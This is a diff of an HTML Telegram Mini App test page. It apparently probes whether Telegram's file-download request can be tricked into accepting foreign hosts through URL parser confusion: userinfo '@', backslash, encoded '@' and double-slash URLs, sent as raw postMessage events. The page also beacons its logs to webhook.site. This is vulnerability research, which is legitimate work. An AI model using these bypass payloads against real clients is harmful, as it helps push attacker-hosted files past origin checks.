@@ -3,7 +3,7 @@
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<title>web-app-ext matrix v4</title>
+<title>web-app-ext matrix v5</title>
 <script src="https://telegram.org/js/telegram-web-app.js"></script>
 <style>
 body { font-family: monospace; background: #fff; color: #111; padding: 6px; font-size: 11px; margin: 0; }
@@ -28,38 +28,36 @@ function log(msg, cls) {
   out.scrollTop = out.scrollHeight;
   try { navigator.sendBeacon(WH + '/log', String(seq) + ' ' + msg); } catch(e) {}
 }
-const hasData = !!tg.initData;
-log('probe4 init platform=' + tg.platform + ' v=' + tg.version + ' initData=' + (hasData ? 'yes' : 'NO'));
+function rawEvent(type, data) {
+  window.parent.postMessage(JSON.stringify({eventType: type, eventData: data}), '*');
+}
+log('probe5 init platform=' + tg.platform + ' v=' + tg.version + ' initData=' + (tg.initData ? 'yes' : 'NO'));
 tg.ready();
+tg.onEvent('file_download_requested', ev => log('EV file_download_requested: ' + JSON.stringify(ev), 'dim'));
 
 const CASES = [
-  { id: 'plain-foreign',  url: WH + '/m1-plain-foreign.png' },
-  { id: 'userinfo',       url: 'https://' + DOM + '@webhook.site/74aa897d-5aac-4477-890c-179212c5e77b/m2-userinfo.png' },
-  { id: 'encoded-at',     url: 'https://' + DOM + '%40webhook.site/m4.png' },
-  { id: 'at-enc-user',    url: 'https://' + DOM + '@%77ebhook.site/74aa897d-5aac-4477-890c-179212c5e77b/m5.png' },
-  { id: 'own-domain',     url: 'https://' + DOM + '/tgmini-zcode/m6-own.png' },
-  { id: 'tg-origin',      url: 'https://web.telegram.org/k/m7-tgorigin.png' }
+  { id: 'own-domain',   url: 'https://' + DOM + '/tgmini-zcode/m6-own.png' },
+  { id: 'userinfo',     url: 'https://' + DOM + '@webhook.site/74aa897d-5aac-4477-890c-179212c5e77b/m2-userinfo.png' },
+  { id: 'backslash',    url: 'https://webhook.site\\@' + DOM + '/m3-backslash.png' },
+  { id: 'enc-user',     url: 'https://' + DOM + '%40webhook.site/m4.png' },
+  { id: 'dbl-slash',    url: 'https://' + DOM + '//webhook.site/74aa897d-5aac-4477-890c-179212c5e77b/m5.png' },
+  { id: 'tg-origin',    url: 'https://web.telegram.org/k/m7-tgorigin.png' }
 ];
 
 let idx = 0;
 function next() {
   if (idx >= CASES.length) { log('MATRIX DONE', 'ok'); return; }
   const c = CASES[idx++];
-  log('[' + c.id + '] calling…', 'dim');
+  log('[' + c.id + '] raw postEvent url=' + c.url, 'dim');
   try {
-    const p = tg.downloadFile(c.url, 'probe_' + c.id + '.png');
-    log('[' + c.id + '] returned ' + (p && typeof p.then === 'function' ? 'Promise' : String(p)));
-    if (p && typeof p.then === 'function') {
-      p.then(v => log('[' + c.id + '] resolved: ' + JSON.stringify(v), 'ok'),
-              e => log('[' + c.id + '] rejected: ' + (e && e.message || e), 'bad'));
-    }
+    rawEvent('web_app_request_file_download', {url: c.url, file_name: 'probe_' + c.id + '.png'});
+    log('[' + c.id + '] posted');
   } catch (e) {
     log('[' + c.id + '] threw: ' + (e && e.message || e), 'bad');
   }
-  setTimeout(next, 3500);
+  setTimeout(next, 5000);
 }
-tg.onEvent('file_download_requested', ev => log('EV file_download_requested: ' + JSON.stringify(ev), 'dim'));
-if (hasData) {
+if (tg.initData) {
   log('autorun in 2s');
   setTimeout(next, 2000);
 } else {
